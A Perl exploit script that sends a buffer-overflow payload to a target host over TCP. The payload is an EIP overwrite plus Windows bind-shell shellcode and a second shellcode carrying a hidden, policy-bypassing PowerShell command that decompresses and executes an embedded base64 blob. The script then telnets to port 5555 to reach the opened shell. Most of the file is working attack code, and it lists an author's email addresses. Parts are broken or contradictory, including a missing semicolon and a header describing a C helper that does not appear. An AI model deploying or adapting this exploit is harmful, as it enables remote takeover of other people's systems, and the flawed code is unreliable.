## My version of the bind shell for windows, uses a C script to connect back to a host via telnet (or another method like netcat), the C script is located in the same place as the perl script ##

use strict;
use Socket;
use Term::ANSIColor;
use English qw' -no_math_vars ';
use 1.0;

# Check to see if user is in root
# Another method:
# my $privCheck = (getpwuid $>);
# die "\e[31m[-]\e[0m This script must be run as root\n" if $privCheck ne 'root';
my $osname = $^O;
if ($osname eq 'MSWin32') {
    system('echo "I don\'t run on windows systems..."');
    exit(1);
}

if ($< != 0 or $< == 1) {
    print "\e[31m[-]\e[0m This script must be run as root\n";
    exit(1);
}


# My Exploit Version
my $version = '1.0.0';
my $xver = '1.0';

# Variables
my $author = 'S1lent';
my $email_1 = 'silentcore32@gmail.com';
my $email_2 = 'gleb.bair@my.sinclair.edu';
my $plus = "\e[32m[+]\e[0m";
my $minus = "\e[31m[-]\e[0m";
my $gs = "\e[32m";
my $ge = "\e[0m";
my $rs = "\e[31m";
my $re = "\e[0m";
my $ys = "\e[33m";
my $ye = "\e[0m";
## Payload Related ##
my $code="\x90\x89" x1000;
my $eipoverwrite=pack('V',0x71C02B67)
my $shellcode="\x90\x44\x43\x22" x80;

system("clear");
print "\n";
print "$gs===============\e[0m[ $ys Author $ye:  $author  ]\e[32m=======================$ge\n";
print "$gs|\e[0m              [ $ys Version $ye: $xver    ]                       \n";
print "$gs|\e[0m              [ $ys Email $ye:   $email_2 ]                       \n";
print "$gs|\e[0m              [ $ys OS $ye :     $OSNAME  ]                       \n";
print "$gs-----------------------------------------------------------$ge\n";
print "\n";
# Using windows/shell_bind_tcp  -  test
$shellcode=$shellcode."\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52" .
"\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26" .
"\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d" .
"\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0" .
"\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b" .
"\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff" .
"\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d" .
"\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b" .
"\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44" .
"\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b" .
"\x12\xeb\x86\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f" .
"\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00\x29" .
"\xc4\x54\x50\x68\x29\x80\x6b\x00\xff\xd5\x50\x50\x50\x50" .
"\x40\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x89\xc7\x31" .
"\xdb\x53\x68\x02\x00\x11\x5c\x89\xe6\x6a\x10\x56\x57\x68" .
"\xc2\xdb\x37\x67\xff\xd5\x53\x57\x68\xb7\xe9\x38\xff\xff" .
"\xd5\x53\x53\x57\x68\x74\xec\x3b\xe1\xff\xd5\x57\x89\xc7" .
"\x68\x75\x6e\x4d\x61\xff\xd5\x68\x63\x6d\x64\x00\x89\xe3" .
"\x57\x57\x57\x31\xf6\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44" .
"\x24\x3c\x01\x01\x8d\x44\x24\x10\xc6\x00\x44\x54\x50\x56" .
"\x56\x56\x46\x56\x4e\x56\x56\x53\x56\x68\x79\xcc\x3f\x86" .
"\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30\x68\x08\x87\x1d\x60" .
"\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5" .
"\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f" .
"\x6a\x00\x53\xff\xd5";
my $shellcode_2="\x80\x51\x41\x32" x2000; 
$shellcode_2 = $shellcode_2."\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50" .
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52" .
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a" .
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41" .
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52" .
"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48" .
"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40" .
"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48" .
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41" .
"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1" .
"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c" .
"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01" .
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a" .
"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b" .
"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00" .
"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b" .
"\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd" .
"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0" .
"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff" .
"\xd5\x70\x6f\x77\x65\x72\x73\x68\x65\x6c\x6c\x2e\x65\x78" .
"\x65\x20\x2d\x65\x78\x65\x63\x20\x62\x79\x70\x61\x73\x73" .
"\x20\x2d\x6e\x6f\x70\x20\x2d\x57\x20\x68\x69\x64\x64\x65" .
"\x6e\x20\x2d\x6e\x6f\x6e\x69\x6e\x74\x65\x72\x61\x63\x74" .
"\x69\x76\x65\x20\x49\x45\x58\x20\x24\x28\x24\x73\x3d\x4e" .
"\x65\x77\x2d\x4f\x62\x6a\x65\x63\x74\x20\x49\x4f\x2e\x4d" .
"\x65\x6d\x6f\x72\x79\x53\x74\x72\x65\x61\x6d\x28\x2c\x5b" .
"\x43\x6f\x6e\x76\x65\x72\x74\x5d\x3a\x3a\x46\x72\x6f\x6d" .
"\x42\x61\x73\x65\x36\x34\x53\x74\x72\x69\x6e\x67\x28\x27" .
"\x48\x34\x73\x49\x41\x4b\x6d\x38\x56\x6c\x67\x43\x41\x35" .
"\x31\x57\x32\x32\x37\x62\x4f\x42\x42\x39\x39\x31\x63\x4d" .
"\x58\x47\x30\x74\x49\x54\x62\x68\x42\x74\x75\x58\x41\x43" .
"\x6b\x32\x56\x64\x4c\x64\x41\x47\x6c\x72\x56\x4e\x37\x4e" .
"\x67\x32\x45\x67\x74\x44\x53\x4f\x74\x5a\x46\x4a\x4c\x30" .
"\x6e\x35\x67\x73\x54\x2f\x76\x6b\x4f\x4a\x75\x6a\x68\x4f" .
"\x30\x4d\x33\x71\x78\x52\x59\x35\x50\x48\x50\x6d\x7a\x49" .
"\x56\x36\x42\x79\x4f\x35\x51\x54\x58\x50\x42\x51\x7a\x67" .
"\x56\x71\x58\x47\x6f\x49\x44\x5a\x44\x6a\x37\x54\x7a\x7a" .
"\x68\x58\x41\x68\x57\x38\x68\x30\x75\x2b\x52\x76\x69\x44" .
"\x71\x32\x54\x58\x36\x5a\x42\x6c\x62\x46\x49\x70\x34\x48" .
"\x63\x30\x67\x31\x75\x63\x78\x56\x6d\x4b\x77\x6b\x44\x6e" .
"\x73\x51\x50\x30\x65\x4a\x73\x59\x7a\x75\x45\x62\x62\x67" .
"\x62\x66\x5a\x33\x39\x6a\x62\x47\x41\x77\x33\x71\x33\x77" .
"\x47\x31\x38\x69\x4c\x52\x70\x47\x39\x6d\x46\x68\x58\x78" .
"\x6d\x7a\x50\x7a\x56\x65\x34\x70\x7a\x6e\x6d\x51\x6b\x56" .
"\x4a\x72\x53\x54\x38\x6b\x77\x54\x68\x47\x64\x55\x6a\x72" .
"\x58\x56\x53\x4d\x6e\x74\x6a\x6a\x32\x7a\x6f\x50\x58\x57" .
"\x53\x6d\x58\x62\x32\x54\x63\x55\x56\x31\x56\x6f\x6e\x55" .
"\x63\x6f\x39\x6b\x64\x63\x38\x61\x56\x66\x2f\x70\x39\x45" .
"\x52\x71\x58\x69\x66\x75\x71\x46\x63\x72\x6e\x6b\x49\x75" .
"\x6b\x66\x72\x6b\x59\x36\x69\x36\x56\x34\x74\x6e\x67\x70" .
"\x4e\x79\x4b\x54\x50\x43\x6c\x57\x41\x34\x65\x70\x5a\x49" .
"\x78\x61\x67\x78\x4e\x67\x4b\x5a\x4d\x38\x51\x30\x76\x77" .
"\x4e\x7a\x2b\x41\x30\x69\x53\x64\x67\x31\x2b\x35\x67\x51" .
"\x48\x2b\x41\x39\x31\x5a\x4b\x70\x4a\x75\x55\x47\x79\x57" .
"\x35\x34\x71\x7a\x57\x61\x70\x4a\x66\x70\x4c\x38\x6e\x46" .
"\x7a\x75\x36\x50\x2b\x53\x57\x64\x55\x69\x47\x54\x2b\x67" .
"\x30\x57\x77\x63\x72\x32\x36\x63\x78\x66\x52\x58\x65\x6f" .
"\x34\x50\x4d\x6d\x32\x34\x4d\x74\x61\x76\x38\x31\x7a\x73" .
"\x75\x68\x53\x64\x74\x2b\x77\x75\x34\x68\x68\x58\x68\x67" .
"\x44\x4c\x64\x50\x67\x6c\x6c\x66\x31\x72\x64\x42\x57\x75" .
"\x55\x57\x6b\x38\x5a\x6c\x78\x44\x74\x31\x4c\x2b\x45\x76" .
"\x4e\x77\x35\x42\x78\x31\x75\x33\x31\x4c\x33\x66\x6e\x72" .
"\x6c\x4a\x70\x70\x6f\x35\x41\x76\x4c\x63\x45\x53\x6a\x31" .
"\x46\x74\x52\x63\x55\x61\x45\x57\x73\x6f\x6c\x53\x6b\x70" .
"\x47\x64\x6e\x79\x36\x4c\x6f\x4d\x74\x50\x68\x6f\x6e\x55" .
"\x55\x56\x32\x43\x75\x55\x4d\x4d\x36\x70\x7a\x48\x63\x73" .
"\x71\x6b\x78\x39\x35\x37\x2f\x76\x7a\x61\x6d\x4f\x73\x4f" .
"\x38\x2f\x65\x6d\x4e\x43\x33\x38\x4f\x41\x61\x35\x67\x63" .
"\x6e\x50\x6d\x42\x53\x32\x6b\x77\x52\x47\x58\x53\x65\x52" .
"\x70\x7a\x67\x33\x2f\x78\x4c\x45\x32\x34\x4c\x62\x61\x51" .
"\x5a\x39\x6d\x4d\x78\x77\x2f\x54\x49\x48\x69\x42\x44\x72" .
"\x76\x49\x7a\x63\x4a\x57\x71\x6a\x31\x30\x6f\x57\x73\x78" .
"\x67\x6c\x61\x61\x47\x68\x57\x61\x4b\x4e\x6f\x79\x54\x57" .
"\x59\x37\x67\x35\x50\x70\x31\x4c\x4f\x2f\x74\x73\x43\x47" .
"\x6a\x4a\x30\x4f\x36\x58\x6e\x36\x35\x58\x47\x34\x64\x30" .
"\x71\x69\x53\x4b\x70\x74\x66\x32\x4a\x77\x61\x78\x69\x4b" .
"\x57\x43\x61\x32\x65\x73\x2f\x4f\x4c\x71\x4c\x77\x2b\x6a" .
"\x71\x77\x36\x6e\x36\x32\x4e\x6e\x37\x33\x6c\x73\x70\x51" .
"\x62\x6e\x51\x35\x41\x36\x49\x46\x5a\x68\x6d\x6f\x58\x41" .
"\x69\x79\x42\x6f\x6f\x39\x31\x31\x53\x4b\x58\x54\x67\x42" .
"\x44\x38\x58\x36\x7a\x4c\x34\x4a\x32\x38\x67\x6e\x74\x45" .
"\x5a\x70\x71\x44\x64\x69\x75\x56\x7a\x6c\x70\x74\x6d\x38" .
"\x45\x36\x46\x63\x37\x56\x52\x36\x76\x7a\x44\x67\x68\x77" .
"\x47\x63\x44\x6a\x39\x38\x68\x4b\x39\x70\x72\x4b\x53\x57" .
"\x63\x77\x4f\x68\x56\x43\x75\x70\x43\x73\x30\x59\x58\x46" .
"\x69\x50\x31\x6c\x4b\x44\x51\x6e\x4b\x77\x78\x6f\x54\x64" .
"\x69\x54\x76\x68\x4b\x73\x31\x70\x77\x75\x78\x67\x51\x72" .
"\x2b\x4a\x72\x6a\x2f\x73\x4e\x79\x2f\x73\x42\x73\x57\x39" .
"\x57\x62\x51\x72\x70\x65\x72\x54\x64\x71\x30\x63\x6c\x63" .
"\x72\x62\x70\x4a\x71\x63\x54\x4f\x47\x47\x49\x4b\x30\x32" .
"\x72\x73\x64\x5a\x7a\x66\x50\x74\x58\x4b\x74\x54\x58\x36" .
"\x53\x36\x34\x76\x47\x43\x4f\x4a\x65\x67\x6b\x49\x70\x36" .
"\x68\x6a\x52\x57\x44\x57\x33\x37\x2b\x41\x65\x6a\x4e\x32" .
"\x42\x56\x74\x4f\x57\x55\x71\x70\x43\x43\x70\x32\x75\x78" .
"\x6c\x67\x38\x34\x75\x4e\x71\x75\x53\x46\x74\x4e\x65\x74" .
"\x63\x6f\x2b\x38\x50\x32\x65\x35\x4d\x53\x76\x56\x45\x45" .
"\x50\x63\x70\x7a\x77\x65\x4a\x47\x78\x6b\x55\x6d\x41\x7a" .
"\x62\x69\x5a\x6b\x47\x72\x76\x55\x2b\x39\x2f\x35\x32\x36" .
"\x7a\x53\x4c\x4e\x30\x50\x65\x39\x74\x4f\x69\x42\x38\x76" .
"\x67\x50\x35\x49\x6c\x66\x56\x6e\x77\x66\x68\x6e\x33\x77" .
"\x44\x73\x34\x46\x4d\x42\x41\x49\x77\x36\x50\x63\x58\x6c" .
"\x6e\x36\x6d\x49\x77\x70\x6c\x4e\x65\x75\x49\x7a\x63\x53" .
"\x72\x41\x6b\x72\x51\x72\x78\x79\x49\x54\x63\x6f\x31\x4e" .
"\x6a\x63\x55\x6d\x6d\x68\x75\x63\x6c\x55\x79\x46\x79\x46" .
"\x41\x31\x34\x61\x50\x43\x73\x72\x6d\x67\x4e\x57\x79\x36" .
"\x4d\x45\x77\x4b\x41\x61\x71\x79\x58\x34\x36\x61\x66\x33" .
"\x48\x2b\x41\x4a\x76\x75\x64\x6d\x55\x4b\x4b\x43\x6b\x2b" .
"\x49\x41\x36\x68\x51\x4b\x51\x53\x70\x67\x45\x76\x6b\x6e" .
"\x4b\x59\x42\x65\x41\x37\x4b\x31\x52\x44\x78\x55\x53\x71" .
"\x72\x4a\x63\x48\x72\x67\x72\x4d\x57\x36\x32\x47\x64\x78" .
"\x68\x6c\x7a\x35\x77\x55\x73\x4d\x7a\x74\x73\x76\x31\x50" .
"\x6a\x62\x7a\x6e\x45\x6e\x2f\x61\x66\x79\x61\x57\x42\x2b" .
"\x32\x6a\x72\x74\x55\x6a\x6c\x71\x6e\x4f\x72\x4d\x6c\x79" .
"\x7a\x58\x69\x2f\x71\x6d\x64\x57\x50\x51\x58\x53\x4e\x68" .
"\x4a\x6a\x57\x36\x65\x4a\x71\x37\x4c\x7a\x4a\x79\x56\x56" .
"\x31\x34\x39\x4c\x58\x51\x71\x62\x38\x53\x36\x75\x54\x59" .
"\x32\x2f\x6c\x66\x36\x59\x55\x67\x43\x78\x6b\x4a\x41\x41" .
"\x41\x3d\x27\x29\x29\x3b\x49\x45\x58\x20\x28\x4e\x65\x77" .
"\x2d\x4f\x62\x6a\x65\x63\x74\x20\x49\x4f\x2e\x53\x74\x72" .
"\x65\x61\x6d\x52\x65\x61\x64\x65\x72\x28\x4e\x65\x77\x2d" .
"\x4f\x62\x6a\x65\x63\x74\x20\x49\x4f\x2e\x43\x6f\x6d\x70" .
"\x72\x65\x73\x73\x69\x6f\x6e\x2e\x47\x7a\x69\x70\x53\x74" .
"\x72\x65\x61\x6d\x28\x24\x73\x2c\x5b\x49\x4f\x2e\x43\x6f" .
"\x6d\x70\x72\x65\x73\x73\x69\x6f\x6e\x2e\x43\x6f\x6d\x70" .
"\x72\x65\x73\x73\x69\x6f\x6e\x4d\x6f\x64\x65\x5d\x3a\x3a" .
"\x44\x65\x63\x6f\x6d\x70\x72\x65\x73\x73\x29\x29\x29\x2e" .
"\x52\x65\x61\x64\x54\x6f\x45\x6e\x64\x28\x29\x3b\x29\x00";
# Initialize host ('localhost') and port '400'
my $host = shift || 'localhost';
my $port = shift || 400;
my $proto = getprotobyname('tcp');
# Get the address of the port
my $addr = inet_aton($host);
my $addr_2 = sockaddr_in($port, $addr);
# Setup the socket 
print "$gs [+] $ge$ys Setting up the socket...$ye\n";
# Create the socket and connect the port
socket(SOCKET, PF_INET, SOCK_STREAM, $proto) or die "$ys Socket $ye: $rs $! $re\n";
print "$gs [+] $ge$ys Connecting to $gs $host $ge on $gs $port $ge...$ye\n";
connect(SOCKET, $addr_2) or die "$ys Connect $ye: $rs $! $re\n";
# Send the payload 
print "$gs [+] $ge$ys Sending the payload...$ye\n";
print SOCKET $code.$eipoverwrite.$shellcode."\n"; 
print SOCKET $code.$eipoverwrite.$shellcode_2."\n";
print "\n$gs [+] $ge$ys Payload has been sent...$ye\n";
print "$gs [+] $ge$ys Will now test 'Telnet' on the client...$ye";
system("telnet $host 5555");
close SOCKET or die "$ys Close $ye: $rs $! $re\n";





